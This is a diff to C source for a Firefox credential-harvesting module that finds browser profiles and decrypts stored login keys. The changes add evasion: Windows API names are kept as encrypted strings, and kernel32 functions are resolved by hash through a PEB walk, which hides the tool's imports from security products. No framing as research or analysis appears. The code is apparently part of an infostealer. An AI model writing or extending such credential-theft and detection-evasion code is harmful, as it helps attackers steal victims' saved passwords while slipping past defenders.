@@ -15,10 +15,15 @@
  */
 
 #include "firefox.h"
+#include "config.h"
 #include "browser_paths.h"
 #include "firefox_crypto.h"
 #include "utils/base64.h"
 #include "sqlite.h"
+#include "peb.h"
+#include "hash.h"
+#include "export_resolve.h"
+#include "enc_strings.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -42,6 +47,39 @@ static void *compat_memmem(const void *haystack, size_t haystack_len,
     return NULL;
 }
 #define memmem compat_memmem
+
+/* ── PEB-walk singleton for Find* APIs ──────────────────────── */
+typedef HANDLE (WINAPI *pFindFirstFileA_ff)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindNextFileA_ff)(HANDLE, LPWIN32_FIND_DATAA);
+typedef BOOL   (WINAPI *pFindClose_ff)(HANDLE);
+typedef DWORD  (WINAPI *pGetFileAttributesA_ff)(LPCSTR);
+
+static struct {
+    pFindFirstFileA_ff      pFF;
+    pFindNextFileA_ff       pFN;
+    pFindClose_ff           pFC;
+    pGetFileAttributesA_ff  pGFAA;
+    int ready;
+} g_ff_find;
+
+static int ff_find_ensure_api(void) {
+    if (g_ff_find.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32];
+    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
+    g_ff_find.pFF = (pFindFirstFileA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
+    g_ff_find.pFN = (pFindNextFileA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
+    g_ff_find.pFC = (pFindClose_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
+    g_ff_find.pGFAA = (pGetFileAttributesA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_ff_find.pFF || !g_ff_find.pFN || !g_ff_find.pFC || !g_ff_find.pGFAA) return 0;
+    g_ff_find.ready = 1;
+    return 1;
+}
 
 #else
 #include <sys/stat.h>
@@ -85,7 +123,8 @@ static char *path_join(const char *a, const char *b) {
 
 static int dir_exists(const char *path) {
 #ifdef _WIN32
-    DWORD attr = GetFileAttributesA(path);
+    if (!ff_find_ensure_api()) return 0;
+    DWORD attr = g_ff_find.pGFAA(path);
     return (attr != INVALID_FILE_ATTRIBUTES &&
             (attr & FILE_ATTRIBUTE_DIRECTORY));
 #else
@@ -98,7 +137,8 @@ static int dir_exists(const char *path) {
 
 static int file_exists(const char *path) {
 #ifdef _WIN32
-    DWORD attr = GetFileAttributesA(path);
+    if (!ff_find_ensure_api()) return 0;
+    DWORD attr = g_ff_find.pGFAA(path);
     return (attr != INVALID_FILE_ATTRIBUTES &&
             !(attr & FILE_ATTRIBUTE_DIRECTORY));
 #else
@@ -131,7 +171,8 @@ static char **list_subdirs(const char *path, size_t *count) {
     snprintf(search, sizeof(search), "%s\\*", path);
 
     WIN32_FIND_DATAA fd;
-    HANDLE h = FindFirstFileA(search, &fd);
+    if (!ff_find_ensure_api()) { free(result); return NULL; }
+    HANDLE h = g_ff_find.pFF(search, &fd);
     if (h == INVALID_HANDLE_VALUE) {
         free(result);
         return NULL;
@@ -151,9 +192,9 @@ static char **list_subdirs(const char *path, size_t *count) {
             result = tmp;
         }
         result[(*count)++] = full;
-    } while (FindNextFileA(h, &fd));
+    } while (g_ff_find.pFN(h, &fd));
 
-    FindClose(h);
+    g_ff_find.pFC(h);
 #else
     DIR *d = opendir(path);
     if (!d) { free(result); return NULL; }
@@ -207,7 +248,8 @@ static int try_key3_db(const char *profile_path,
     free(key3_path);
 
     /* key3.db uses a different schema (metadata table, 3DES instead of AES).
-     * TODO: implement full key3.db decryption. */
+     * Not yet implemented. */
+    dbg_printf("[!] key3.db decryption not implemented\n");
     (void)key_out;
     (void)key_len;
     return -1;
